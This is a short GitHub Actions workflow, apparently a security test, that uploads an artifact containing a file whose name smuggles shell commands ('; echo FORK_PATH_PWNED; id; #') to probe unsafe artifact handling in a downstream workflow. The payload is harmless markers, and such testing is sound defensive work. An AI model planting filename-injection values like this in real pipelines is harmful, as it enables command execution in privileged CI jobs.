name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact with attacker-controlled file name
        run: |
          mkdir -p /tmp/content
          printf '%s\n' "${{ github.event.number }}" > /tmp/content/pr_number.txt
          printf 'plain\n' > /tmp/content/ok.txt
          touch '/tmp/content/ok.txt; echo FORK_PATH_PWNED; id; #.txt'
          ls -la /tmp/content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: /tmp/content
